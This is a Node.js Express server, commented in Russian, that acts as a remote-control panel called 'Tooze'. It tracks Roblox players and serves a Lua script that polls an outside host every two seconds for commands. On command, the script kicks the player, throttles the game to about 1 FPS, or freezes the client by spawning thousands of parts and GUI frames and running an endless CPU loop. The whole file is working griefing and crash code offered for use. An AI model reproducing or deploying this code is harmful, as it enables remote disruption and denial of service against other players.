const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// === НАСТРОЙКА ===
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// === ХРАНИЛИЩЕ ===
const players = {};

// === 1. РЕГИСТРАЦИЯ ===
app.get('/api/register', (req, res) => {
    const username = req.query.username;
    if (!username) return res.status(400).send('Username required');
    
    if (!players[username]) {
        players[username] = {
            command: null,
            lagActive: false
        };
        console.log(`✅ Игрок зарегистрирован: ${username}`);
    }
    res.send('OK');
});

// === 2. СПИСОК ИГРОКОВ ===
app.get('/api/players', (req, res) => {
    const playerList = Object.keys(players).map(name => ({
        username: name,
        lagActive: players[name].lagActive || false
    }));
    res.json(playerList);
});

// === 3. ОТПРАВКА КОМАНДЫ ===
app.post('/api/command', (req, res) => {
    const { username, command, value } = req.body;
    
    if (!username || !command) {
        return res.status(400).json({ error: 'Username and command required' });
    }
    
    if (!players[username]) {
        return res.status(404).json({ error: 'Player not found' });
    }
    
    players[username].command = command;
    
    if (command === 'lag' && value !== undefined) {
        players[username].lagActive = value;
    }
    
    console.log(`📨 Команда "${command}" отправлена игроку ${username}`);
    res.json({ success: true, command, player: username });
});

// === 4. ПОЛУЧЕНИЕ КОМАНД ДЛЯ ИГРОКА ===
app.get('/api/get_commands', (req, res) => {
    const username = req.query.username;
    
    if (!username || !players[username]) {
        return res.send('');
    }
    
    const command = players[username].command || '';
    players[username].command = null;
    
    res.send(command);
});

// === 5. ОСНОВНОЙ СКРИПТ ===
app.get('/api/get_exec_script', (req, res) => {
    const mainScript = `
-- ============================================
-- ОСНОВНОЙ СКРИПТ TOOZE v5
-- ============================================

local serverUrl = _G.ToozeServer or "https://crasher-panel.onrender.com"
local player = game.Players.LocalPlayer

if not player then
    warn("❌ Tooze: Не удалось получить игрока!")
    return
end

print("🚀 Tooze загружен для: " .. player.Name)

-- === РЕГИСТРАЦИЯ ===
local function register()
    local success, err = pcall(function()
        game:HttpGet(serverUrl .. "/api/register?username=" .. player.Name)
    end)
    if success then
        print("✅ Регистрация успешна")
    else
        warn("❌ Ошибка регистрации: " .. tostring(err))
    end
end

-- === LAG ENGINE - ОГРАНИЧЕНИЕ ДО 1 FPS ===
local lagCoroutine = nil
local lagActive = false

local function startLag()
    if lagCoroutine then return end
    lagActive = true
    
    lagCoroutine = coroutine.create(function()
        print("🐌 Lag Engine включен (1 FPS)")
        while lagActive do
            -- Заставляем игру рендерить с задержкой
            for i = 1, 60 do
                game:GetService("RunService").RenderStepped:Wait()
                -- Добавляем нагрузку на каждый кадр
                local dummy = Instance.new("Part")
                dummy.Size = Vector3.new(1, 1, 1)
                dummy.CFrame = CFrame.new(0, -9999, 0)
                dummy.Parent = workspace
                dummy:Destroy()
            end
            task.wait(1) -- Искусственная задержка до 1 FPS
        end
        print("🐌 Lag Engine выключен")
    end)
    
    task.spawn(lagCoroutine)
end

local function stopLag()
    lagActive = false
    lagCoroutine = nil
end

-- === CRASH - ПОЛНАЯ ЗАМОРОЗКА ===
local function freezeGame()
    print("💥 ЗАМОРОЗКА: Парализация игры...")
    
    -- 1. Создаем бесконечные частицы
    for i = 1, 5000 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(100, 100, 100)
        part.CFrame = CFrame.new(
            math.random(-5000, 5000),
            math.random(500, 5000),
            math.random(-5000, 5000)
        )
        part.Anchored = true
        part.Parent = workspace
    end
    
    -- 2. Бесконечный цикл, блокирующий поток
    local freezeThread = coroutine.create(function()
        while true do
            -- Загружаем CPU
            for i = 1, 1000 do
                math.sin(math.random() * 999999)
            end
            -- Загружаем GPU через рендер
            game:GetService("RunService").RenderStepped:Wait()
            game:GetService("RunService").Heartbeat:Wait()
            task.wait()
        end
    end)
    
    task.spawn(freezeThread)
    
    -- 3. Создаем бесконечные GUI (нагружаем UI)
    for i = 1, 100 do
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ToozeFreeze_" .. i
        screenGui.Parent = player.PlayerGui
        
        for j = 1, 50 do
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(0.1, 0, 0.1, 0)
            frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
            frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
            frame.Parent = screenGui
        end
    end
    
    print("💥 Заморозка выполнена!")
end

-- === ОБРАБОТКА КОМАНД ===
local function checkCommands()
    local success, response = pcall(function()
        return game:HttpGet(serverUrl .. "/api/get_commands?username=" .. player.Name)
    end)
    
    if not success then return end
    
    if response == "kick" then
        print("👢 Получена команда KICK")
        player:Kick("Вас кикнули через Tooze Panel")
        
    elseif response == "crash" then
        print("💥 Получена команда FREEZE")
        freezeGame()
        
    elseif response == "lag" then
        print("🐌 Получена команда LAG")
        -- Toggle lag
        if lagActive then
            stopLag()
        else
            startLag()
        end
    end
end

-- === ЗАПУСК ===
register()

-- Проверка команд каждые 2 секунды
while task.wait(2) do
    checkCommands()
end
    `;
    
    res.setHeader('Content-Type', 'text/plain');
    res.send(mainScript);
});

// === СТАТУС СЕРВЕРА ===
app.get('/api/status', (req, res) => {
    res.json({ 
        status: 'online', 
        players: Object.keys(players).length,
        uptime: process.uptime()
    });
});

// === ЗАПУСК ===
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер Tooze запущен!`);
    console.log(`📍 Порт: ${PORT}`);
    console.log(`🌐 Адрес: http://localhost:${PORT}`);
});

// === ОБРАБОТКА ОШИБОК ===
app.use((err, req, res, next) => {
    console.error('❌ Ошибка сервера:', err);
    res.status(500).json({ error: 'Internal server error' });
});
